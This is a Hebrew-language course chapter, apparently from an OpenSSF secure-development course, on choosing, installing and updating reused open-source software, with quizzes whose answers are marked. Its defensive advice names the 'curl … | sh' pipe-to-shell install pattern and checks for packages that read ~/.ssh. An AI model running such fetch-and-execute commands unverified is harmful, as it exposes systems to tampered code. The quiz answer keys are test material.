מערכות רבות תומכות בהתקנת הרחבות שפותחו ומתוחזקות בנפרד מתוכנית "הליבה" (לעתים קרובות על ידי מפתחים שונים).  ***הרחבות צריך להיות מוערכות בנפרד לפני התקנתן***. מערכת הליבה עשויה להיות מאובטחת יחסית, אבל זה לא אומר שכל ההרחבות שלה מאובטחות, ולעתים קרובות הסיכונים הגדולים ביותר הם מההרחבות. הרחבות אלה עשויות להיקרא בשמות רבים, כולל הרחבות, יישומי Plug-in, הרחבות, ערכות נושא, רכיבים או חבילות. לא משנה איך קוראים להם, העריכו גם אותם. לדוגמה, PatchStack דיווחה כי בזמן שוורדפרס (WordPress) הפעילה 43.2% מהאתרים באינטרנט בשנת 2021, "פגיעויות מתוספים וערכות עיצוב נשארות כאחד האיומים הגדולים ביותר על אתרים הבנויים על וורדפרס". הם ציינו כי רק 0.58% מפגיעויות האבטחה מקורן בליבת וורדפרס בשנה זו; שאר הפגיעויות היו ברכיבים (תוספים וערכות נושא). יתרה מכך, 29% מהתוספים של וורדפרס עם נקודות תורפה קריטיות לא תוקנו. זה לא היה משנה כל כך אם מעט אתרים היו משתמשים ברכיבים, אבל בממוצע באתר וורדפרס מותקנים 18 רכיבים שונים (תוספים וערכות נושא). ראה [*מצב האבטחה של WordPress בשנת 2021*](https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/) על ידי PatchStack לקבלת מידע נוסף.

אנחנו משתמשים כאן במונח "תוכנה בשימוש חוזר", מכיוון שזה מבטא את החשש שלנו. תוכנה שנעשה בה שימוש חוזר כוללת את כל התוכנות שאנו תלויים בהן כאשר התוכנה פועלת, המכונה גם יחסי התלות שלה.

הרוב המכריע של התוכנות שבהן נעשה שימוש חוזר יהיו בדרך כלל תוכנות קוד פתוח (Open Source Software - OSS). בואו נתמקד בטיפים כיצד להעריך תוכנות קוד פתוח לפני השימוש בהן. חלק מהטיפים הללו יחולו גם על תוכנות קוד סגור.

### בחירה (הערכה) של תוכנות קוד פתוח

ישנם נושאים חשובים רבים שיש לקחת בחשבון בעת בחירת תוכנת קוד פתוח.

קרן אבטחת הקוד הפתוח (OpenSSF) פיתחה [*מדריך תמציתי להערכת תוכנות קוד פתוח*](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme) שיכול לעזור. המדריך מציע כי, "כמפתח או מפתחת תוכנה, לפני השימוש בתלות או בכלים של תוכנת קוד פתוח (OSS), יש לזהות מועמדים אפשריים ולהעריך את המובילים ביניהם אל מול הצרכים. על מנת להעריך את האבטחה והקיימות של תלות פוטנציאלית בתוכנת קוד פתוח, יש לשקול את השאלות הבאות..."

גירסת 2022-09-01 מציעה את השאלות הבאות, יחד עם האופן שבו ניתן לקבל מידע שיעזור לענות עליהן:

1. **האם ניתן להימנע מהוספת התלות?**  האם אפשרי במקום זה להשתמש בתלות קיימת (אולי עקיפה)? כל תלות חדשה מגדילה את שטח התקיפה (נזק בתלות החדשה, או בתלות טרנזיטיבית שלה, עלול לערער את המערכת).
2. **האם אתה מעריך את הגרסה המיועדת?**  יש לוודא שאנו מעריכים את הגרסה המיועדת של התוכנה, לא פורק (fork) אישי ולא כזה אשר בשליטת תוקף. טכניקות אלה מסייעות להתמודד עם התקפת "שגיאת הקלדה" או טייפוסקוואטינג (typosquatting) הנפוצה (שבה תוקף יוצר שם "כמעט נכון").
    1. בדקו את שמו ואת אתר האינטרנט של הפרויקט עבור הקישור.
    2. אמתו את קישור הפורק (fork) ב- GitHub / GitLab.
    3. בדקו האם הפרויקט מזוהה עם קרן (במקרה זה, אמורים להיות מסוגלים לגשת למקור הרשמי מאתר האינטרנט של הקרן).
    4. בדקו את זמן היצירה שלה,ואת הפופולריות שלה.
3. **האם התלות מתוחזקת?**  תוכנה לא מתוחזקת היא סיכון; רוב התוכנות זקוקות לתחזוקה שוטפת. אם היא לא מאובטחת, סביר להניח שהיא גם לא בטוחה.
    1. האם התרחשה פעילות משמעותית לאחרונה (למשל, עדכוני קוד) בשנה האחרונה?
    2. מתי שוחררה הגירסא האחרונה שלה (האם זה היה לפני פחות משנה)?
    3. האם יש מתחזקי קוד רבים, באופן אידיאלי מארגונים שונים?
    4. האם יש גרסאות אחרונות או הכרזות מהמתחזק(ים)?
    5. האם מספר הגרסה מצביע על חוסר יציבות (למשל, מתחיל ב-"0", כולל "אלפא" או "בטא" וכו')
4. **האם יש ראיות לכך שהמפתחים שלה פועלים כדי להפוך אותה למאובטחת?**
    1. קיבעו האם הפרוייקט הרוויח את (או נמצא בדרך ל) [תג שיטות עבודה מומלצות של קרן אבטחת הקוד הפתוח (OpenSSF).](https://bestpractices.coreinfrastructure.org/)
    2. בידקו מידע על הפרוייקט ב [https://deps.dev](https://deps.dev/), וכן את ניקוד [כרטיסי הניקוד של OpenSSF (Scorecard)](https://github.com/ossf/scorecard) ופגיעויות ידועות.
    3. קיבעו האם התלויות של החבילה מעודכנות (באופן יחסי).
    4. קיבעו האם יש תיעוד המסביר את האבטחה (המכונה "מקרה הבטחה").
    5. האם יש בדיקות אוטומטיות הכלולות בתהליך האינטגרציה הרציפה (CI) ? מהו אחוז כיסוי הבדיקה (coverage)?
    6. האם באגים בפרויקט מתוקנים (במיוחד באגים באבטחה) בזמן? האם  תיקוני אבטחה משוחררים עבור מהדורות ישנות יותר? האם יש להם גרסת LTS (תמיכה לזמן ארוך)?
    7. האם מפתחי ומפתחות הפרוייקט משתמשים בתכונות אבטחה של שירותי אירוח קוד היכן שרלוונטי (למשל, אם הם נמצאים ב-GitHub או ב-GitLab, האם הם משתמשים בהגנה על בראנצ'ים (branches))?
    8. זהו ביקורות אבטחה והאם נמצאו בעיות כלשהן. ביקורות אבטחה הן נדירות יחסית, אך ראו את "ביקורות האבטחה" של [OpenSSF](https://github.com/ossf/security-reviews).
    9. השתמשו בעקרונות [המנחים של SAFECode _להערכת אבטחת תוכנה_](https://safecode.org/resource-managing-software-security/principles-of-software-assurance-assessment/) (2019), גישה רב-שכבתית לבחינת אבטחת התוכנה.
    10. מה רמת התאימות לנושאים מתוך [ מדריך העזר להבטחת אבטחה ](https://www.openchainproject.org/)של OpenChain ([המדריך לאוגוסט 2021](https://www.openchainproject.org/security-guide) והטיוטה [העדכנית יותר](https://github.com/OpenChain-Project/SecurityAssuranceGuide/tree/main/Guide/2.0))?
    11. האם מיושמות שיטות עבודה מתוך [המדריך התמציתי לפיתוח תוכנה מאובטחת](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme)?
5. **האם קל להשתמש בה בצורה מאובטחת?**

    1. האם תצורת ברירת המחדל ו"הדוגמאות הפשוטות" מאובטחות (למשל, הצפנה מופעלת כברירת מחדל בפרוטוקולי רשת)? אם לא, יש להימנע מכך.
    2. האם הממשק/API מתוכנן להיות קל לשימוש בצורה מאובטחת (למשל, אם הממשק מיישם שפה, האם הוא תומך בשאילתות עם פרמטרים)?
    3. האם יש הדרכה לשימוש בצורה מאובטחת?

6. **האם יש הוראות כיצד לדווח על פגיעויות?** עיינו [במדריך ליישום תהליך מתואם של גילוי פגיעויות עבור פרוייקטי קוד פתוח](https://github.com/ossf/oss-vulnerability-guide/blob/main/guide.md) לקבלת הדרכה לפרויקטים של קוד פתוח.
7. **האם יש שימוש משמעותי?**  תוכנה עם משתמשים רבים או משתמשים גדולים עשויה להיות בלתי הולמת לשימושך. עם זאת, סביר יותר להניח שתוכנה הנמצאת בשימוש נרחב תציע מידע שימושי על אופן השימוש המאובטח בה, ויותר אנשים ידאגו לאבטחה שלה. בידקו האם שם דומה הוא פופולרי יותר - זה יכול להצביע על התקפת הקלדה.
8. **מהו רישיון התוכנה?**  מבחינה טכנית, רישיונות הם לא אבטחה, אבל לרישיונות יכולה להיות השפעה משמעותית על אבטחה וקיימות. ודאו שלכל רכיב יש רישיון, שזהו רישיון [OSI](https://opensource.org/licenses) בשימוש נרחב. אם מדובר בתוכנת קוד פתוח, יש לוודא שהוא עולה בקנה אחד עם השימוש המיועד שלך. פרויקטים שלא מספקים פרטי רישיון ברורים נוטים פחות לפעול לפי שיטות עבודה טובות אחרות שמובילות לתוכנה מאובטחת.
9. **מהי ההערכה שלך לגבי הקו?**  אפילו סקירה קצרה של קוד המקור של התוכנה, והשינויים שלה לאורך זמן, יכולה לתת לך כמה תובנות. להלן דברים שיש לקחת בחשבון:
    1. כאשר בודקים את קוד המקור, האם יש ראיות בקוד לכך שהמפתחים והמפתחות ניסו לפתח תוכנה מאובטחת (כגון אימות קלט קפדני של קלט לא מהימן ושימוש בהצהרות פרמטריות)?
    2. האם יש עדויות לתוכנה לא מאובטחת/ לא שלמה (למשל, הצהרות TODO רבות)?
    3. מהן הבעיות "המובילות" המדווחות על-ידי כלי ניתוח סטטיים?
    4. האם יש ראיות לכך שהתוכנה זדונית? לפי [_Backstabber’s Knife Collection_](https://arxiv.org/abs/2005.09535), בידקו את קוד ההתקנה וקוד הקפי נוסף עבור תהליכים זדוניים, בידקו האם ישנה משיכת נתונים מ **~/.ssh** ומשתני סביבה, וחפשו ערכים מקודדים / מעורפלים המבוצעים. בידקו את פעולות עידכון הקוד, קומיט (commit) האחרונות לאיתור קוד חשוד (ייתכן שתוקף הוסיף אותן לאחרונה).
    5. שיקלו להפעיל את התוכנה בתוך ארגז חול (Sandbox) כדי לנסות להפעיל ולזהות קוד זדוני.
    6. שיקלו להפעיל את כל מקרי הבדיקה המוגדרים כדי להבטיח שהתוכנה תעבור אותם.

משאבים אחרים שייתכן שנירצה לשקול כוללים:

1. [מדריך Tidelift לבחירת חבילות מיטבית (פברואר 2021)](https://tidelift.com/subscription/choosing-open-source-packages-well), Tidelift
2. [התוכנית להערכת תוכנות קוד פתוח / תוכנה חופשית (OSS / FS)](https://dwheeler.com/oss_fs_eval.html)

ניתן למצוא חלק מהמידע הנידרש במקורות רבים (מעבר לשימוש פשוט במנוע חיפוש). למשל בדף הבית ו/או מאגר קוד המקור של הפרויקטים, בדף הראשי של מאגר החבילות הראשי של הטכנולוגיה המפותחת (package repository), [deps.dev](https://deps.dev/), [metrics.openssf.org](https://metrics.openssf.org/), [libraries.io](https://libraries.io/), Synopsys Black Duck [OpenHub](https://www.openhub.net/) וקרן לינוקס [LFX](https://lfx.linuxfoundation.org/).

רוב השאלות הללו חלות גם על תוכנות קוד סגור שנעשה בהן שימוש חוזר.

רוב התוכנות תלויות בתוכנות אחרות, אשר בתורן תלויות לעתים קרובות בתוכנות אחרות וכך הלאה בשכבות רבות. שטר חומרים של תוכנה (SBOM) הוא מלאי מקונן המזהה את רכיבי התוכנה המרכיבים פיסת תוכנה גדולה יותר. לטכנולוגיות רבות יש פורמטים ספציפיים להן של SBOM. ישנם גם כמה פורמטים של SBOM התומכים בטכנולוגיות שרירותיות: [חילופי נתונים של חבילת תוכנה (SPDX),](https://spdx.dev/) [מזהה תוכנה (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/) ו[- CycloneDX](https://github.com/CycloneDX/specification). כאשר SBOM זמין עבור רכיב שאנו חושבים להשתמש בו, לעתים קרובות קל יותר להשתמש בנתונים אלה כדי לעזור לענות על כמה מהשאלות המפורטות לעיל. מאותן הסיבות, כדאי גם לספק SBOM למשתמשים פוטנציאליים של התוכנה שלך.

> שעת סיפור: התקפת "שגיאת הקלדה"  או טייפוסקוואטינג (Typosquatting) על יד jeIlyfish ו python3-dateutil

> ב-2019-12-01 גילה מפתח התוכנה הגרמני לוקאס מרטיני כי שתי ספריות פייטון (Python) במאגר החבילות הפופולרי PyPI (Python Package Index) יישמו התקפות הקלדה. חבילות זדוניות אלה היו גונבות מפתחות SSH ו- GPG פרטיים ממפתחים ומפתחות שהשתמשו בהם. החבילה  הזדונית `jeIlyfish` חיקתה את החבילה הלא זדונית `jellyfish` תוך גרימת הנזק (שימו לב שבשם החבילה הזדונית התו השלישי הינו אות גדולה "`I`", ולא אות קטנה "`l`"). אותו תוקף העלה גם חבילה זדונית בשם `python3-dateutil` אשר חיקתה את הספרייה הפופולרית `dateutil` עבור Python3. החבילה  הזדונית `python3-dateutil` לא כללה קוד זדוני בעצמה, אלא במקום זאת טענה את החבילה הזדונית `jeIlyfish` כתלות. החבילה  הזדונית `python3-dateutil` הייתה ב PyPI רק יומיים, אבל החבילה הזדונית `jeIlyfish` הייתה זמינה במשך כמעט שנה. שתי הספריות הוסרו על ידי PyPI מיד לאחר שנודע כי ("[שתי ספריות Python זדוניות נתפסו גונבות מפתחות SSH ו- GPG" על ידי Catalin Cimpanu, ZDNet, 2019](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/)).

#### חידון 3.1: בחירה (הערכה) של תוכנות קוד פתוח

\>\>מהי הוכחה לכך שהתוכנה שחושבים לעשות בה שימוש חוזר תהיה כנראה בחירה טובה מבחינת אבטחה? בחרו את כל התשובות הרלוונטיות.<<

[!x] עדות לכך שקל להשתמש בצורה מאובטחת

[x] פרויקט קוד פתוח שהרוויח את תג שיטות העבודה המומלצות של OpenSSF

[x] פרויקט קוד פתוח עם מספר תורמים פעילים בשנה האחרונה

[ ] לתוכנה אין הצהרת רשיון

### הורדה והתקנה של תוכנה לשימוש חוזר

כמובן, אם נוריד ונתקין גרסה לא רשמית של התוכנה בשימוש חוזר, זו יכולה להיות בעיה רצינית. ודאו את קבלת הגרסה *הנכונה* של התוכנה:

1. ודאו שיש לכם בדיוק את השם הנכון. התקפה נפוצה נקראת "שגיאת הקלדה" או טייפוסקוואטינג (Typosquatting). בשגיאות הקלדה, תוקף ייצור שם חבילה או דומיין (domain) הדומים באופן מכוון וזדוני לרכיב תוכנה הנמצא בשימוש נרחב, וישתמש בשם מטעה זה כדי להפיץ גירסה זדונית של אותה תוכנה. [Ohm & all, 2020](https://arxiv.org/abs/2005.09535) מצא כי *"רוב החבילות הזדוניות [תוכנות קוד פתוח] מחקות שמות חבילות קיימות באמצעות שגיאות הקלדה".* לדוגמה:

    1. בידקו האם קיימים שינויי שם מטעים נפוצים. קל לעבור בין מקף (**-**) לקו תחתון (**&#95;** ). אחד (*1*) והאות L באותיות קטנות (*l*) נראים דומים, וכך גם אפס (*0*) ו- O (**O**). בחלק ממנהלי החבילות (package managers), אותיות גדולות וקטנות ASCII נחשבות שונות; במצבים אלה, היזהרו מתווים שכאלה. Unicode מספק תווים שנראים בדיוק כמו ASCII, אך מקורם באלפבית אחר, כמו קירילית או יוונית; במקרים מסוימים, אף אלה יכולים להיות מנוצלים.

    2. בידקו עד כמה החבילה פופולרית. בדרך כלל הגרסה הפופולרית יותר היא הגרסה הנכונה. עבור חבילות, השוו את מספר ההורדות של חבילות בעלות שם דומה. אלה עם מספר הורדות נמוך יותר עשויות להיות מקור להתקפות הקלדה. שיקלו להשתמש במנוע חיפוש כדי לזהות את החבילה או הדומיין הפופולריים ביותר. עם זאת, הקפידו *להתעלם* מכל הדומיינים המפורסמים במנוע חיפוש; תוקפים עלולים לשלם כדי לפרסם את הגרסה הזדונית שלהם!

    3. בידקו את תאריך ההפצה של החבילה. האחרון ביותר הוא לעתים קרובות זה שרצינו.

2. הקפידו להוריד ולהתקין את התוכנה בצורה אמינה:

    1. עליך להוריד ישירות את התוכנה מהאתר הראשי שלה או מאתר הפצה מחדש שניתן לסמוך עליו (כגון מאגר הפצת הלינוקס שלך או המאגר הסטנדרטי של מנהל חבילות (package manager) עבור שפת התכנות שלך).

    2. בדרך כלל צריך להשתמש ב **https**:  (TLS) כדי להוריד את התוכנה, לא **http:**, שכן בדרך זו אנו מבטיחים יצירת קשר עם האתר המבוקש תוך מניעה מתוקפים יכולת לשנות את התוכנה בדרך אליך.

    3. שיקלו להוריד את התוכנה, אך לאחר מכן להתקיו אותה ולהשתמש בה רק כמה ימים לאחר מכן, לאחר אימות ששום דבר לא השתנה. בדרך זו, אם אתר ההפצה נפרץ באופן זמני בעת הורדת התוכנה, אבל הוא תוקן במהירות, לא נשתמש בגירסה זדונית. זה לא תמיד מעשי, שכן יכול להיות שלא נוכל להמתין, אבל במקרים מסוימים זהו צעד פשוט.

    4. נסו להימנע משימוש בשיטת פייפ-טו-של (pipe-to-shell) (כגון  **curl … | sh**) כדי להוריד ולהתקין תוכנה. כאשר נשתמש בשיטה זו, אין באפשרותנו לעכב את ההתקנה לאחר ההורדה. בנוסף, תוקפים המזייפים אתר מקור יכולים לזהות בקשה מפייפ-טו-של ולחתור באופן סלקטיבי תחת המשתמשים בשיטה זו, אשר מעצם הגדרתם אינם בודקים את מה שהם מורידים (ראה [ספרו של פיל "זיהוי השימוש ב-curl | bash" צד שרת"](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)). השימוש בפייפ-טו-של הופך את זיהוי וניטרול זיוף באתר המקור לקשה הרבה יותר. בנוסף, הוא מקשה על הבנת הגרסה בפועל שהורדת והתקנת - כך שאיבדת למעשה שליטה מסוימת בגרסה, ולא ניתן לסמוך על אחרים כדי לקבוע מה קרה. כן, התוכנית המותקנת יכולה לדווח על גירסה, אך תוכניות יכולות לדווח על כל מספר ויכולות לדווח על אותו מספר עבור גירסאות בפועל שונות. בקיצור, השימוש בפייפ-טו-של מגדיל את הסיכונים שלך.

        עם זאת, שימוש בפייפ-טו-של רק בסביבה מבודדת (למשל, קונטיינר או מכונה וירטואלית עם הרשאות מוגבלות) תוך הקפדה שלא להשתמש בקבצים המיוצרים, כפי שקורה לעתים קרובות בסביבות הבדיקה של תהליכי אינטגרציה רציפה (CI), הוא הרבה פחות מסוכן. במצבים מסויימים אף קשה להימנע משימוש בפייפ-טו-של, בתלות כיצד התוכנה בשימוש חוזר מופצת, ולפעמים זה לא שווה לנסות להימנע מכך. לכן זהו טיפ ששווה לקחת בחשבון, אבל לא תמיד שווה לקיים. **זכרו**: התמקדו בניהול סיכונים, ולא בהימנעות מוחלטת מסיכונים.

    5. באם זה חשוב ואפשרי, נסו לוודא שהחבילה חתומה דיגיטלית על ידי יוצריה הצפויים (או לפחות המפיצים מחדש שלה). תוכנה לאימות חתימה דיגיטלית של חבילה, או חתומה באופן קריפטוגרפי, קיימת כבר עשרות שנים. במצבים מסוימים, ישנו אימות אוטומטי שהחבילה אכן מגיעה ממפיץ מחדש. עם זאת, לעתים קרובות קשה יותר לוודא שיש לך את המפתחות הציבוריים המתאימים הנכונים (זוהי דוגמה לבעיית *ניהול מפתחות*.) יש עבודה מתמשכת בתחום זה, למשל,  פרויקט [סיגסטור sigstore](https://www.sigstore.dev/) פועל כדי להקל באופן משמעותי על חתימה דיגיטלית ואימות ממצאי תוכנה.  כאשר ניתן לייצר ולאמת חתימות דיגיטליות, השתמשו בהן.

    6. היזהרו מתלות ביכולת להוריד ולהתקין רכיבים בזמן ריצה ממיקומים אחרים (חיצוניים). זהו נוהג נפוץ עבור יישומי אינטרנט רבים, במיוחד עבור הרכיבים בצד הלקוח שלהם כגון רכיבי JavaScript ו- webfonts. עם זאת, הסיכון הוא שאם מיקום זה הופך ללא זמין (עקב התקפה או פשוט משום שהספק מחליט להפסיק לתמוך בו), המערכת שלך תהפוך ללא זמינה. הספק עשוי להיות ארגון גדול, אך הוא עדיין עשוי לבחור להפסיק לתמוך בתלות שלנו בו. לפני שניסמוך על משהו בזמן ריצה שלא לצורך, לפחות חיקרו כדי לקבוע את המהימנות העתידית של שירות זה, והשתמשו בשירות אמין כגון רשת הפצת תוכן (CDN) ידועה.

בנוסף, וודאו שהמערכת אינה פגיעה להתקפת "החלפת תלות" (“dependency confusion” או “substitution”). פגיעות זו משפיעה על מערכות המזהות רשימה של תלויות ואשר מוגדרות לאחזר תלויות אלה מיותר ממאגר (ריפוזיטורי, repository) אחד. מערכות כאלה מוגדרות לעתים קרובות להיות תלויות בחבילה P כלשהי שבה המפתחים הניחו שחבילה P תאוחזר ממאגר מסוים (בדרך כלל מאגר פרטי). הפגיעות מתרחשת אם לא מתקיימת *דרישה* לאחזר את החבילה P מהמאגר הצפוי שלה. אם אין תהליך המוודא זאת, תוקף יכול ליצור חבילה זדונית P עם אותו שם במאגר *אחר* (בדרך כלל מאגר ציבורי), ולהטעות את המערכת להשתמש בחבילה זדונית זו במקום זאת הצפויה. תוקפים יכולים לנקוט צעדים רבים כדי להפוך את השימוש בחבילה הזדונית לסביר, כגון מתן מספר גרסה גבוה יותר לגרסה הזדונית שלהם. זו אינה התקפה תיאורטית; תוקפים החלו לנצל פגיעות זו באופן נרחב בשנת 2021. (לקבלת מידע נוסף, ראו "[3 דרכים להפחית סיכונים בעת שימוש במאגרי חבילות פרטיים](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/)" מאת מיקרוסופט ו["החלפת תלות: איך פרצתי לאפל, מיקרוסופט ועשרות חברות אחרות"](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)מאת אלכס בירסן.) ישנם אמצעי נגד שונים להחלפת תלות, למשל:

1. השתמשו בפיד (הזנה, feed) יחיד (לדוגמה, מאגר יחיד או רישום יחיד). אם יש מקור אחד, אין מקום לבלבול.
2. הצהירו בבירור, עבור כל חבילה, מאיפה יש לאחזר אותה. שיטה זו נקראת לעתים "טווח מבוקר" (controlled scope).
3. תעדפו את הפידים (feeds) כך שתמיד אלה המהימנים ביותר יתושאלו לפני המהימנים פחות ואלה המהימנים פחות יתושאלו רק כאשר המהימנים יותר מדווחים במפורש שהחבילה לא נמצאה. ודאו שהפידים הפחות מהימנים לעולם לא יעקפו את המהימנים יותר.
4. השתמשו בתכונות אימות בצד הלקוח. גישה אחת היא לאכוף הצמדת תלות (dependency pinning) המכונה הצמדת גרסה, כלומר, לדרוש שימוש בגרסה ידועה ספציפית. ניתן לאכוף זאת על ידי דרישת ערך קריפטוגרפי (cryptographic hash) ספציפי (המכונה "טביעת אצבע דיגיטלית") עבור החבילה. גישה נוספת היא אימות תקינות על מנת לוודא שהחבילה שהורדת זהה לפעם הראשונה שבה היא הורדה.

 החלפת תלות הוא מקרה מיוחד של הפגיעות #34 מתוך 25 המובילים של CWE לשנת 2021, *רכיב נתיב חיפוש בלתי מבוקר* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)). הסתמכות על תוספים, ספריות או מודולים ממקורות לא מהימנים, והסתמכות על רשתות אספקת תוכן לא אמינות, וכמו כן גם נחשבת לחלק מפגיעות #8 מתוך עשרת המובילים של OWASP לשנת 2021 (A08:2021), *כשלים בתקינות תוכנה ותקינות נתונים*.


#### חידון 3.2: הורדה והתקנה של תוכנה לשימוש חוזר

\>\>מהן דרכים טובות להשגת תוכנה? בחרו את כל התשובות הרלוונטיות.<<

[!x] בדיקה חוזרת שהשם המבוקש הוא אכן זה שרצית (למשל, **-** ו- **&95;** אינם מוחלפים, **O** ו **0** אינם מוחלפים, וכן הלאה)  

[x] שימוש ב - **https**:, לא ב - **http:**

[x] שיקלו להוריד את התוכנה, אך לאחר מכן להתקין אותה רק כמה ימים לאחר מכן לאחר אימות שאין בעיות שדווחו באתר

### עדכון תוכנה שנעשה בה שימוש חוזר

#### עדכון רכיבי תוכנה שנעשה בהם שימוש חוזר

בפועל, יהיו רכיבי תוכנה רבים שנעשה בהם שימוש חוזר, והם יצטרכו להתעדכן מדי פעם. לפעמים ימצאו פגיעות באחת מהן, ובמקרה זה עלינו לקבל את ההודעה על כך במהירות ולעדכן אותה במהירות. כתוצאה מכך, עלינו לנהל רכיבים שנעשה בהם שימוש חוזר:

1. השתמשו במנהלי חבילות, במערכות בקרת גרסאות (כגון git), בכלי בנייה ובבדיקות אוטומטיות כדי שתוכלו לקבוע בקלות אילו גירסאות בדיוק קיימות מכל רכיב שנעשה בו שימוש חוזר על מנת שנוכל לעדכן במהירות כל אחת מהן.

2. הסתמכו רק על ממשקים והתנהגות *מתועדים*, והימנע מממשקים מיושנים, כדי למקסם את הסבירות ליכולת לעדכן תוכנות שנעשה בהן שימוש חוזר בעת הצורך.

3. *צפו* לעדכון התוכנות אשר בשימוש, עד רמת הפלטפורמה הבסיסית ביותר. זה נאיבי להניח שלעולם לא יהיה צורך לעדכן את התוכנה במהירות.

4. אל תשנו קוד של תוכנת קוד פתוח (OSS) ותיצרו "פורק (fork) מקומי" משלכם. אם תתוקן פגיעות בגירסה מאוחרת יותר של אותה מערכת הפעלה, יהיה קשה יותר ויותר לשלב תיקון זה. במקום זאת, אם עליך לשנות חלק ממערכות ההפעלה כך שיתאימו לצרכים שלך, יש לעבוד עם פרויקט הקוד הפתוח המקורי (אפסטרים - upstream) כדי לשלב את השיפורים שלך בגרסה הרשמית. לאחר מכן, גירסאות חדשות יותר של אותו פרויקט הקוד הפתוח, כולל אלה שמתקנות פגיעויות, יכללו גם את היכולות הדרושות לך.

5. שימרו על עדכניות יחסית של התוכנה שנעשה בה שימוש חוזר. ככל שהרכיבים שנעשה בהם שימוש חוזר ישנים יותר, ייתכן שיהיה קשה מאוד להחליף גרסה פגיעה בגרסה תקינה.

6. נטרו כדי לקבוע אם באחת מגרסאות התוכנה שבהן יש שימוש התגלתה פגיעות הידועה לציבור. נדון בכך בהמשך הפרק על ניתוח הרכב תוכנה (SCA).

>  שעת סיפור: אקוויפקס

> בתוכנה הנפוצה סטרוטס של אפאצ'י (Apache Struts) היתה פגיעות קריטית שתוקנה ב 2017-03-06 ודווח עליה באופן נרחב בעיתונות המיחשוב. מתווך הנתונים אקוויפקס (Equifax) קיבלו הודעה מאפאצ'י (Apache), מהארגון האמריקאי לתגובה למקרי סייבר (CERT) ומהמחלקה לביטחון המולדת של ארה"ב על הפגיעות, וקיבלו הוראות כיצד לבצע את התיקון. עם זאת, אקוויפקס (Equifax) נכשלו ביישום עדכון בזמן. *"חודשיים לאחר מכן, אקוופיקס (Equifax) עדיין לא הצליחו לתקן את המערכות שלהם. בסופו של דבר, ב-29 ביולי התוקפים ניצלו את הפרצה כדי לגשת למאגרי המידע של החברה ולגנוב מידע צרכני. ב-13 במאי, יותר מחודשיים לאחר שאקוויפקס (Equifax) הייתה צריכה לתקן את הפגיעות". היא דיווחה כי "145.5 מיליון לקוחות בארה"ב, כ-44% מהאוכלוסייה, [האמריקאית] הושפעו מהפרצה... התוקפים קיבלו גישה ל ... בדיוק סוג המידע שעבריינים יכולים להשתמש בו כדי להתחזות לקורבנות אל מול בנקים, חברות כרטיסי אשראי, חברות ביטוח, חברות סלולר ועסקים אחרים הפגיעים להונאות. כתוצאה מכך, כל 143 מיליון הקורבנות בארה"ב נמצאים בסיכון גבוה יותר לגניבת זהות, ויישארו בסיכון במשך שנים רבות. ואלה שסובלים מגניבת זהות יתקשו במשך חודשים, אם לא שנים, כשהם פועלים לנקות את שמם ואת דירוג האשראי שלהם".* (ברוס שנייר, [*על הפריצה לאקוויפקס: עדות והצהרה של ברוס שנייר, 2017*)](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html)

#### עדכון אופן השימוש בתוכנה שנעשה בה שימוש חוזר (הימנעות/החלפה של ממשקים מיושנים)

אנחנו לא רק צריכים לעדכן רכיבים שיש בהם שימוש, אלא גם את איך שאנחנו משתמשים בהם.

כאשר רכיבים מתעדכנים, לפעמים הממשק שלהם מתחלף בממשק חדש/משופר על פני ממשק מיושן/לא בשימוש. כאשר הדבר מעשי, עלינו להימנע או להחליף שימושים כלשהם בממשקים המיושנים/שהוצאו משימוש. לפעמים הממשק מיושן בגלל פגיעות אבטחה. בנוסף, ממשקים מיושנים אלה נשמטים בדרך כלל עם הזמן, כך שאם נשתמש בממשק המיושן, ייתכן שלא ניתן יהיה לעדכן במהירות אם תימצא פגיעות מאוחר יותר.

אם ברצוננו ליישן ממשק המשמש אחרים, נעשה כמיטב יכולתנו לספק תקופת מעבר ארוכה שבה גם הממשקים הישנים וגם החדשים זמינים. פרויקטים מסוימים לא יוכלו לעבור בקלות, וזה יכול לפעמים לקחת זמן. ניסיון לכפות עדכון מהיר גורם לעתים קרובות לתגובות וגורם למשתמשים *לדחות* את העדכונים שלך או לעכב את השימוש בהם, מה שעלול להוביל לבעיות אבטחה ארוכות טווח.

#### שימוש חוזר בתוכנה: סיכום

אלה הם רק טיפים, והם בשום אופן לא ממצים. זה נהדר שיש לנו כל כך הרבה תוכנות נהדרות לשימוש חוזר; פיתוח תוכנה מודרני יהיה בלתי אפשרי בלעדיהם. עם זאת, יש כמה מלכודות אבטחה פוטנציאליות בתוכנות שנעשה בהן שימוש חוזר. שיטות העבודה שדיברנו עליהן בפרק זה יעזרו לך להימנע מבעיות אבטחה רבות עקב תוכנות שנעשה בהן שימוש חוזר.

#### חידון 3.3: עדכון תוכנה בשימוש חוזר

\>\>שימוש חוזר בתוכנה היא פעולה מסוכנת, ולכן תמיד צריך להעדיף לשכתב את התוכנה בעצמך כאשר הדבר אפשרי. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. בטח, ישנם סיכונים בעת שימוש חוזר בתוכנה, אבל יש סיכונים בכתיבת תוכנה בעצמך. סביר להניח שגם אתם תעשו טעויות, ואלה שכתבו את התוכנה לשימוש חוזר השקיעו לא פעם שנים בפיתוח מומחיות בתחום הספציפי הזה. במקום לנסות לשכתב הכל - מה שיהיה לא מעשי מבחינה כלכלית - עליכם לגשת לשימוש חוזר בתוכנה כבעיית ניהול סיכונים. יש לבחון את הבחירות שלכם, כולל שימוש בטיפים כאן, כדי לקבל החלטות מנומקות.

[הסבר]

# חלק א': בחינת גמר

* לא כלול כחלק מהגרסה החינמית של הקורס.

# חלק ב': יישום

# יסודות היישום

### סקירה כללית של היישום

ייתכן שאתה יודע מה התוכנה שלך אמורה לעשות (דרישות) וייתכן שיש לך דרך לחלק את הבעיה (עיצוב). אבל אם היישום שלך הוא רע, התוכנה היא רעה!

